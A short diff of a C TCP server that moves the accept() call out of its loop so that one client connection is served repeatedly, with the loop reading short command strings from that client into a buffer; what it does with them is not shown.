@@ -19,6 +19,8 @@ int main(int argc, char *argv[]){
     struct sockaddr_in client;
 
     int sockfd, sockfd_client, bytes;
+    int size = sizeof(struct sockaddr_in);
+
     char cmd[1024];
 
     if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
@@ -52,14 +54,14 @@ int main(int argc, char *argv[]){
     printf("[+]Port: %d\n", SERVER_PORT);
     
 
-    while(1){
-        int size = sizeof(struct sockaddr_in);
-        
-        if((sockfd_client = accept(sockfd, (struct sockaddr *) &client, &size)) < 0){
-            perror("socket");
-            exit(1);
-        }
+    if((sockfd_client = accept(sockfd, (struct sockaddr *) &client, &size)) < 0){
+        perror("socket");
+        exit(1);
+    }
 
+
+    while(1){
+        
         memset(cmd, 0, sizeof(cmd));
 
         if((bytes = recv(sockfd_client, cmd, 50, 0)) < 0){
